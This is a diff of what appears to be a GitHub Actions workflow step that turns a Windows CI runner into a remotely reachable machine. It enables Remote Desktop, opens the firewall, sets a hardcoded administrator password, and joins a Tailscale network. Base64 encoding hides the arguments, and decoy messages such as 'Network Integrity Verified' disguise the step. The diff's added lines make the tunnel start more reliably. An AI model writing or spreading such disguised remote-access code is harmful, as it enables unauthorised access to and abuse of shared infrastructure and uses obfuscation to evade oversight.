@@ -30,21 +30,35 @@ jobs:
       env:
         SYS_TOKEN: ${{ secrets.TAILSCALE_AUTH_KEY }}
       run: |
-        $ErrorActionPreference = 'SilentlyContinue'
+        $ErrorActionPreference = 'Continue'
         Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
         Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
         $fw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlIERlc2t0b3A="))
         Enable-NetFirewallRule -DisplayGroup $fw
         $p = ConvertTo-SecureString -AsPlainText "P@ssw0rd123!" -Force
         Set-LocalUser -Name "runneradmin" -Password $p
+        
         $ts_path = "$env:ProgramFiles\Tailscale\tailscale.exe"
+        $service = Get-Service -Name "TailscaleIPN" -ErrorAction SilentlyContinue
+        if ($service.Status -ne 'Running') {
+            Start-Service -Name "TailscaleIPN"
+            Start-Sleep -Seconds 5
+        }
+        
         $cmd_up = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXA="))
         $cmd_key = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LS1hdXRoa2V5PQ=="))
         $cmd_host = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LS1ob3N0bmFtZT0="))
+        
         Write-Host "Initializing Network Interface..."
-        & $ts_path $cmd_up "${cmd_key}$env:SYS_TOKEN" "${cmd_host}sys-check-$env:GITHUB_RUN_ID"
+        & $ts_path $cmd_up "${cmd_key}$env:SYS_TOKEN" "${cmd_host}sys-check-$env:GITHUB_RUN_ID" 2>&1 | Out-Default
+        
         $ip = & $ts_path ip -4
-        Write-Host "Network Integrity Verified. ID: $ip"
+        if ($ip) {
+            Write-Host "Network Integrity Verified. ID: $ip"
+        } else {
+            Write-Error "Connection failed. Please check logs for auth errors."
+            exit 1
+        }
 
     - name: Stability Monitor
       run: |
